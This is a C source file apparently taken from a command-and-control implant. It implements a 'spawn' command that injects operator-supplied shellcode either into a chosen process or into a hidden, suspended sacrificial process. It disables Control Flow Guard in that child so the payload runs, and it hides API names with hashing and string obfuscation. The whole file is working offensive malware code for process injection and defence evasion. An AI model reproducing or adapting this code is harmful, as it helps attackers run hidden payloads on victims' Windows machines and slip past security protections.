#include "config.h"
#ifdef INCLUDE_CMD_SPAWN

#include "commands.h"
#include "evasion/injection.h"

// djb2 hashes (key 8527) for on-demand resolution from kernel32
// djb2 hashes: key=8527, seed=7 (H_MAGIC_KEY/H_MAGIC_SEED)
#define H_INITIALIZEPTALIST 0x29e0531du  // InitializeProcThreadAttributeList
#define H_UPDATEPTATTRIBUTE 0x1a79e5d2u  // UpdateProcThreadAttribute
#define H_DELETEPTALIST     0xe21e375eu  // DeleteProcThreadAttributeList

// Mitigation policy: disable CFG in the child so the injected payload (an
// anonymous RWX allocation) is not rejected by LdrpHandleInvalidUserCallTarget
// during DLL init. Without this, any DLL whose init routine makes a
// CFG-checked indirect call trips FAST_FAIL_GUARD_ICALL_CHECK_FAILURE
// (0xC0000409) — dump-verified on rundll32 loading localspl.dll (spoolss
// chain) and HostNetSvc.dll (wininet chain).
#ifndef PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_OFF
#define PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_OFF (0x0002ULL << 40)
#endif
#ifndef PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x00020007
#endif
#ifndef EXTENDED_STARTUPINFO_PRESENT
#define EXTENDED_STARTUPINFO_PRESENT 0x00080000
#endif

typedef BOOL  (WINAPI *fnInitPTAList)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
typedef BOOL  (WINAPI *fnUpdatePTAttr)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
typedef VOID  (WINAPI *fnDeletePTAList)(LPPROC_THREAD_ATTRIBUTE_LIST);

VOID cmd_spawn(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD pid = parser_int32(args);
    DWORD sc_len = 0;
    BYTE* sc = parser_bytes(args, &sc_len);

    if (!sc || sc_len == 0) {
        package_add_string(inst, response, XSTR("no shellcode provided"));
        response->is_error = TRUE;
        return;
    }

    if (pid != 0) {
        if (inject_shellcode(inst, pid, sc, sc_len, NULL)) {
            char msg[64];
            UINT64 msg_len = 0;
            xstr(msg_inj, "injected into process ");
            for (UINT64 k = 0; k + 1 < sizeof(msg_inj) && msg_len < sizeof(msg) - 1; k++)
                msg[msg_len++] = msg_inj[k];
            char num[12];
            int nn = 0;
            unsigned int upid = pid;
            if (upid == 0) num[nn++] = '0';
            while (upid > 0) { num[nn++] = (char)('0' + (upid % 10)); upid /= 10; }
            while (nn > 0 && msg_len < sizeof(msg) - 1) msg[msg_len++] = num[--nn];
            msg[msg_len] = 0;
            package_add_string(inst, response, msg);
        } else {
            package_add_string(inst, response, XSTR("injection failed"));
            response->is_error = TRUE;
        }
        return;
    }

    if (inst->Spawnto.x64[0] == '\0') {
        package_add_string(inst, response, XSTR("no spawnto path configured"));
        response->is_error = TRUE;
        return;
    }

    wchar_t wcmd[600];
    es_memset(wcmd, 0, sizeof(wcmd));
    inst->Win32.MultiByteToWideChar(0, 0, inst->Spawnto.x64, -1, wcmd, 299);

    if (inst->Spawnto.x64_args[0]) {
        int pos = 0;
        while (wcmd[pos]) pos++;
        wcmd[pos++] = L' ';
        inst->Win32.MultiByteToWideChar(0, 0, inst->Spawnto.x64_args, -1, wcmd + pos, 299);
    }

    // ── Extended startup info: disable CFG in the child ──
    // kernel32 forwards these to api-ms-win-core-processthreads-l1-1-0 which
    // resolve_function's PEB walk can't find (API sets aren't listed by set
    // name). Use GetProcAddress which handles the API set redirect internally.
    xstr(_s_ipta, "InitializeProcThreadAttributeList");
    xstr(_s_upta, "UpdateProcThreadAttribute");
    xstr(_s_dpta, "DeleteProcThreadAttributeList");
    fnInitPTAList   pInitPTAList   = (fnInitPTAList)inst->Win32.GetProcAddress(
        (HMODULE)inst->Modules.Kernel32, _s_ipta);
    fnUpdatePTAttr  pUpdatePTAttr  = (fnUpdatePTAttr)inst->Win32.GetProcAddress(
        (HMODULE)inst->Modules.Kernel32, _s_upta);
    fnDeletePTAList pDeletePTAList = (fnDeletePTAList)inst->Win32.GetProcAddress(
        (HMODULE)inst->Modules.Kernel32, _s_dpta);

    STARTUPINFOEXW siex;
    es_memset(&siex, 0, sizeof(siex));
    siex.StartupInfo.cb = sizeof(siex);
    siex.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    siex.StartupInfo.wShowWindow = SW_HIDE;

    DWORD create_flags = CREATE_SUSPENDED | CREATE_NO_WINDOW;
    BOOL have_attr = FALSE;

    if (pInitPTAList && pUpdatePTAttr) {
        SIZE_T attr_size = 0;
        pInitPTAList(NULL, 1, 0, &attr_size);
        if (attr_size > 0) {
            siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)es_malloc(inst, attr_size);
            if (siex.lpAttributeList) {
                if (pInitPTAList(siex.lpAttributeList, 1, 0, &attr_size)) {
                    // Two DWORD64s: policy1 (standard CFG off) + policy2 (strict CFG off).
                    // Passing 16 bytes tells the kernel both policy sets are present.
                    DWORD64 policy[2] = {
                        PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_OFF,
                        (0x0002ULL << 8)  // STRICT_CONTROL_FLOW_GUARD_ALWAYS_OFF
                    };
                    if (pUpdatePTAttr(siex.lpAttributeList, 0,
                            PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                            &policy, sizeof(policy), NULL, NULL)) {
                        create_flags |= EXTENDED_STARTUPINFO_PRESENT;
                        have_attr = TRUE;
                    }
                }
                if (!have_attr) {
                    if (pDeletePTAList) pDeletePTAList(siex.lpAttributeList);
                    es_free(inst, siex.lpAttributeList);
                    siex.lpAttributeList = NULL;
                }
            }
        }
    }

    // Fall back to plain STARTUPINFOW if attribute setup failed
    PROCESS_INFORMATION pi;
    es_memset(&pi, 0, sizeof(pi));

    BOOL created;
    if (have_attr) {
        created = inst->Win32.CreateProcessW(
            NULL, wcmd, NULL, NULL, FALSE,
            create_flags,
            NULL, NULL, (LPSTARTUPINFOW)&siex, &pi);
    } else {
        STARTUPINFOW si;
        es_memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        created = inst->Win32.CreateProcessW(
            NULL, wcmd, NULL, NULL, FALSE,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            NULL, NULL, &si, &pi);
    }

    // Cleanup attribute list
    if (have_attr) {
        if (pDeletePTAList) pDeletePTAList(siex.lpAttributeList);
        es_free(inst, siex.lpAttributeList);
    }

    if (!created) {
        package_add_string(inst, response, XSTR("CreateProcessW failed"));
        response->is_error = TRUE;
        return;
    }

    HANDLE hThread = inject_shellcode_into(inst, pi.hProcess, pi.hThread, sc, sc_len, NULL);
    if (!hThread) {
        inst->Win32.TerminateProcess(pi.hProcess, 1);
        gate_CloseHandle(inst, pi.hThread);
        gate_CloseHandle(inst, pi.hProcess);
        package_add_string(inst, response, XSTR("injection into spawned process failed"));
        response->is_error = TRUE;
        return;
    }

    // early cascade returns the initial thread handle itself (the payload
    // rides it via the shim-callback APC) - do not close it twice
    if (hThread != pi.hThread)
        gate_CloseHandle(inst, hThread);
    gate_CloseHandle(inst, pi.hThread);
    gate_CloseHandle(inst, pi.hProcess);

    // report the sacrificial image + PID so the operator can correlate the
    // new session; the callback id itself is assigned when
    // the child checks in, so it can't be included here.
    {
        // basename of the spawnto image
        int last_sep = -1;
        for (int k = 0; wcmd[k] && k < 599; k++)
            if (wcmd[k] == L'\\') last_sep = k;
        const wchar_t* img = &wcmd[last_sep + 1];

        char msg[340];
        UINT64 msg_len = 0;
        xstr(msg_pre, "spawned into ");
        for (UINT64 k = 0; k + 1 < sizeof(msg_pre) && msg_len < sizeof(msg) - 1; k++)
            msg[msg_len++] = msg_pre[k];
        while (*img && msg_len < sizeof(msg) - 1)
            msg[msg_len++] = (char)(*img++);
        msg[msg_len] = 0;
        // append " (<pid>)"
        char num[12];
        int nn = 0;
        unsigned int pid = (unsigned int)pi.dwProcessId;
        if (pid == 0) num[nn++] = '0';
        while (pid > 0) { num[nn++] = (char)('0' + (pid % 10)); pid /= 10; }
        if (msg_len < sizeof(msg) - (UINT64)nn + 3) {
            msg[msg_len++] = ' ';
            msg[msg_len++] = '(';
            while (nn > 0) msg[msg_len++] = num[--nn];
            msg[msg_len++] = ')';
            msg[msg_len] = 0;
        }
        package_add_string(inst, response, msg);
        // diagnostic: did the CFG-off mitigation attribute actually land?
        {
            const char* st = !pInitPTAList ? " [cfg=NORES]"
                           : (have_attr ? " [cfg=set]" : " [cfg=FAIL]");
            package_add_string(inst, response, st);
        }
    }
}

#endif
